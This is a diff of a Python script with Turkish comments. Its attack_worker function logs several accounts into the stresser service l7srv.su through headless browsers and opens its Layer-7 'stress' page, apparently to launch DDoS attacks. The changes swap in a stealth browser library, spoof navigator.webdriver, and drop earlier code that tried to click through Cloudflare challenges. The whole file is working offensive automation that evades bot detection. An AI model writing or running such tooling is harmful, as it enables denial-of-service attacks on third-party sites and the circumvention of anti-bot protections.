@@ -2,11 +2,10 @@ import threading
 import time
 import os
 import sys
-from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
-from playwright_stealth import stealth_sync  # playwright-stealth kütüphanesi
+from rebrowser_playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
 
 ACCOUNTS_FILE = "accounts.txt"
-MAX_CONCURRENT = 2  # Aynı anda en fazla 2 hesap
+MAX_CONCURRENT = 2
 
 def load_accounts():
     accounts = []
@@ -56,78 +55,36 @@ def attack_worker(account):
                     user_data_dir=profile_dir,
                     headless=True,
                     viewport={"width": 1280, "height": 720},
-                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                    args=[
-                        "--no-sandbox",
-                        "--disable-dev-shm-usage",
-                        "--disable-gpu",
-                        "--disable-blink-features=AutomationControlled",
-                        "--disable-features=IsolateOrigins,site-per-process"
-                    ],
-                    slow_mo=150
+                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
+                    slow_mo=100
                 )
                 page = context.new_page()
-                
-                # Stealth eklentisini uygula
-                stealth_sync(page)
-                
-                # WebDriver tespitini manuel olarak da engelle
                 page.add_init_script("""
                     Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-                    Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
-                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                 """)
 
-                # ---------- CLOUDFLARE BYPASS ----------
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor (URL: https://l7srv.su/login)...")
                 try:
-                    # Sayfayı yükle, ancak bekleme süresini uzun tut
                     response = page.goto("https://l7srv.su/login", timeout=60000, wait_until="domcontentloaded")
+                    if response:
+                        print(f"[{username}] ✅ Sayfa yüklendi. HTTP Durum Kodu: {response.status}")
+                        if response.status >= 400:
+                            print(f"[{username}] 🛑 {response.status} Forbidden - Cloudflare veya WAF tarafından engelleniyor olabilir.")
+                            raise Exception(f"HTTP {response.status}")
+                    else:
+                        print(f"[{username}] ❌ Yanıt alınamadı (response None).")
+                        raise Exception("No response")
                     
-                    if response and response.status == 403:
-                        print(f"[{username}] 🛑 403 Forbidden - Cloudflare veya WAF tarafından engelleniyor olabilir.")
-                        print(f"[{username}] ⏳ Cloudflare bekleme sayfası kontrol ediliyor...")
-                        
-                        # Cloudflare challenge sayfasını tespit et
-                        try:
-                            # "I'm human" veya "Verify" butonlarını ara
-                            challenge_selector = "input[type='checkbox'][name='cf-turnstile-response'], #challenge-form, .challenge-form, #cf-challenge, .cf-challenge"
-                            page.wait_for_selector(challenge_selector, timeout=10000)
-                            print(f"[{username}] ✅ Cloudflare challenge tespit edildi, çözülmeye çalışılıyor...")
-                            # Basitçe checkbox'a tıkla veya bekle
-                            page.click(challenge_selector)
-                            time.sleep(5)
-                            # Sayfanın yeniden yüklenmesini bekle
-                            page.wait_for_load_state("networkidle", timeout=30000)
-                            print(f"[{username}] ✅ Cloudflare challenge geçildi.")
-                        except:
-                            print(f"[{username}] ⚠️ Cloudflare challenge bulunamadı, direkt devam ediliyor.")
-                            # 403 devam ediyorsa hata fırlat
-                            if response and response.status == 403:
-                                raise Exception("HTTP 403 hala devam ediyor, Cloudflare aşılamadı.")
+                    page.wait_for_load_state("domcontentloaded", timeout=10000)
+                    time.sleep(3)  # Cloudflare challenge için ekstra bekleme
                     
-                    # Sayfa düzgün yüklendiyse devam et
-                    page.wait_for_load_state("domcontentloaded", timeout=30000)
-                    time.sleep(2)
-                    
-                    # Kullanıcı adı alanını kontrol et
                     if page.locator("#username").count() == 0:
                         print(f"[{username}] ⚠️ #username alanı bulunamadı, sayfa farklı olabilir.")
                     else:
                         print(f"[{username}] ✅ #username alanı mevcut.")
 
-                except Exception as e:
-                    print(f"[{username}] ❌ Sayfa yüklenirken hata: {e}")
-                    context.close()
-                    consecutive_errors += 1
-                    wait_time = 30 if consecutive_errors < 3 else 120
-                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
-                    time.sleep(wait_time)
-                    continue
-
-                # ---------- GİRİŞ ----------
-                print(f"[{username}] 📝 Form dolduruluyor...")
-                try:
+                    print(f"[{username}] 📝 Form dolduruluyor...")
                     page.fill("#username", username)
                     page.fill("#password", password)
 
@@ -136,11 +93,23 @@ def attack_worker(account):
                     page.click("#loginNextBtn")
                     print(f"[{username}] 🖱️ Butona tıklandı.")
 
-                    # Dashboard'a yönlenene kadar bekle
                     page.wait_for_url(lambda url: "/dash" in url, timeout=60000)
                     print(f"[{username}] ✅ Giriş başarılı, dashboard'a yönlendirildi.")
                     consecutive_errors = 0
 
+                except PlaywrightTimeout as timeout_err:
+                    print(f"[{username}] ❌ Zaman aşımı: {timeout_err}")
+                    try:
+                        current_url = page.url
+                        print(f"[{username}] 📍 Mevcut URL: {current_url}")
+                    except:
+                        pass
+                    context.close()
+                    consecutive_errors += 1
+                    wait_time = 30 if consecutive_errors < 3 else 120
+                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
+                    time.sleep(wait_time)
+                    continue
                 except Exception as login_err:
                     print(f"[{username}] ❌ Giriş hatası: {login_err}")
                     context.close()
@@ -154,9 +123,8 @@ def attack_worker(account):
                 print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
                     response = page.goto("https://l7srv.su/dash/stress", timeout=30000, wait_until="domcontentloaded")
-                    if response and response.status == 403:
-                        print(f"[{username}] ⚠️ Stress sayfası 403 verdi, yeniden deneniyor...")
-                        raise Exception("Stress 403")
+                    if response:
+                        print(f"[{username}] ✅ Stress sayfası yüklendi. HTTP {response.status}")
                     page.wait_for_load_state("domcontentloaded", timeout=10000)
                     time.sleep(2)
                     if page.locator("#layer_7").count() == 0:
